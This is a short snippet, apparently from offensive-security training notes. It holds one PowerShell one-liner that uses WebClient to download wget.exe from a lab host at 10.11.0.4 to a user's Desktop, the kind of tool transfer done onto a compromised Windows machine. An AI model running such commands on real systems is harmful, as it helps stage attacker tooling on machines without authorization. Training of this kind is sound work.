# 1) non-interactive downloading of files
```ps
powershell -c "(new-object
System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Deskto
p\wget.exe')"
```
